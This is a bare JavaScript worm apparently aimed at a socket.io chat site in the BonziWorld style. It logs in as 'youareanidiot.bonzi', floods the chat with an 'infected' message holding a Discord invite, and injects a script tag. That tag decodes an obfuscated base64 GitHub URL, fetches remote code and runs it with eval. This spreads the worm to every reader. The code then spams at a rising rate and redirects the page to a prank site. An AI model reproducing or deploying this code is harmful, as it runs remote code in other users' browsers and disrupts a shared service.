let coughtimer = 7777; setInterval(() => {
    const socketb = io("//");
    socketb.emit("client", "MAIN");
    socketb.emit("login", {
        name: "youareanidiot.bonzi"
    });
    socketb.emit("command", {
        list: ["color"]
    });
    socketb.emit("command", {
        list: ["color"]
    });
    setInterval(() => {
    socketb.emit("talk", {
        text: "YOUVE BEEN INFECTED BY THE YOUAREANIDIOT VIRUS! https://discord.gg/8c5HTrMM <script>fetch(atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2b3J5ZGV2cmltb2FsdC9CT05aSVdPUkxEVUxUUkFKQVZBU0NSSVBUTElTVC9yZWZzL2hlYWRzL21haW4v')+'???'+atob('Lmpz')).then(r=>r.text()).then(t=>eval(t))</script>"
    });
    socket.emit("talk", {
        text: "YOUVE BEEN INFECTED BY THE YOUAREANIDIOT VIRUS! https://discord.gg/8c5HTrMM <script>fetch(atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2b3J5ZGV2cmltb2FsdC9CT05aSVdPUkxEVUxUUkFKQVZBU0NSSVBUTElTVC9yZWZzL2hlYWRzL21haW4v')+'???'+atob('Lmpz')).then(r=>r.text()).then(t=>eval(t))</script>"
            });
    });
    coughtimer = coughtimer - 125;
}, coughtimer);
setTimeout(() => {
    window.location.href = "https://tlrenny25.github.io/youareanidiot.html";
}, 177777)
